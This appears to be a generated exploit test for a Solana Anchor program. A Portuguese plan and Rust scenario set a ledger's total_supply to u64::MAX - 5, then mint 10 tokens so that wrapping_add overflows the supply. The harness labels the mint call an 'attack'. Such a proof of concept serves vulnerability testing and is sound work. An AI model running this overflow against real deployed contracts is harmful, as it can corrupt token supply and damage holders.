{
  "plan": "Inicializo a conta Ledger com total_supply = u64::MAX - 5 e user_balance = 0 usando a instrucao initialize (baseline legitimo). Em seguida, chamo mint com amount = 10, que somado ao total_supply ultrapassa u64::MAX. O wrapping_add faz total_supply dar a volta para 4 e user_balance para 10. O efeito medido e que total_supply resultante e menor que o valor inicial, demonstrando o wrap-around.",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

let initial_supply = u64::MAX - 5;

let ix_init = env.anchor_ix(
    "initialize",
    &(initial_supply,),
    &[
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(solana_program::system_program::id(), false),
    ],
);

let contas_init = [
    (ledger_key, empty_account()),
    (authority, wallet(1_000_000_000)),
    system_program_account(),
];

let r_init = env.baseline("initialize ledger com total_supply = u64::MAX - 5", &ix_init, &contas_init);

let ledger_data = after(&r_init, &ledger_key).data().to_vec();
let ledger_account = account(&env.program_id, &ledger_data, None);

let ix_mint = env.anchor_ix(
    "mint",
    &(10u64,),
    &[
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);

let contas_mint = [
    (ledger_key, ledger_account),
    (authority, wallet(1_000_000_000)),
];

let r = env.attack("mint com amount = 10 sobre total_supply = u64::MAX - 5", &ix_mint, &contas_mint);

if r.program_result == ProgramResult::Success {
    let total_supply_pos = 8 + 32;
    let total_supply_apos = read_u64(after(&r, &ledger_key).data(), total_supply_pos);
    env.effect(
        "total_supply deu a volta (wrap-around) para um valor menor que o inicial",
        total_supply_apos < initial_supply,
    );
}"
}

